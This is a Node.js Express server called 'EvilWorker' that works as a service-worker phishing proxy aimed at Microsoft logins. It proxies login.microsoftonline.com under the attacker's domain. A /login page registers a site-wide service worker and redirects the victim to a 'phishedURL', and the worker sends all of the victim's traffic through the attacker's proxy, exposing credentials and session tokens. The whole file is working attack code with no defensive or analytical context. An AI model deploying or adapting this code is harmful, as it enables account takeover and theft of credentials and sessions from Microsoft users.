const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static('.'));

// Proxy middleware for EvilWorker
app.use('/proxy', createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    pathRewrite: {
        '^/proxy': ''
    },
    onProxyReq: (proxyReq, req, res) => {
        console.log('Proxying request to:', proxyReq.path);
    },
    onError: (err, req, res) => {
        console.error('Proxy error:', err);
        res.status(500).send('Proxy error');
    }
}));

// Handle EvilWorker login URLs
app.get('/login', (req, res) => {
    const redirectUri = req.query.redirect_urI;
    if (redirectUri) {
        res.send(getIndexHTML(redirectUri));
    } else {
        res.status(400).send('Missing redirect_urI parameter');
    }
});

// Service worker endpoint
app.get('/service_worker_Mz8XO2ny1Pg5.js', (req, res) => {
    res.setHeader('Content-Type', 'text/javascript');
    res.setHeader('Service-Worker-Allowed', '/');
    res.send(getServiceWorkerJS());
});

// Default route
app.get('/', (req, res) => {
    res.send('<h1>EvilWorker Proxy Server</h1><p>Server is running on AWS!</p>');
});

app.listen(PORT, () => {
    console.log(`EvilWorker server running on port ${PORT}`);
});

function getIndexHTML(redirectUri) {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EvilWorker</title>
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    console.log("Service worker registered");
                    const phishedURL = new URL(decodeURIComponent("${redirectUri}"));
                    console.log("Redirecting to:", phishedURL.href);
                    self.location.replace(phishedURL.href);
                })
                .catch((error) => {
                    console.error("Service worker registration failed:", error);
                });
        }
        else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;
}

function getServiceWorkerJS() {
    return `self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = \`\${self.location.origin}/proxy\${request.url.replace(self.location.origin, '')}\`;

    try {
        const response = await fetch(proxyRequestURL, {
            method: request.method,
            headers: request.headers,
            body: request.body,
            redirect: "manual",
            mode: "cors"
        });
        
        return response;
    }
    catch (error) {
        console.error("Proxy request failed:", error);
        return new Response("Proxy request failed", { status: 500 });
    }
}`;
}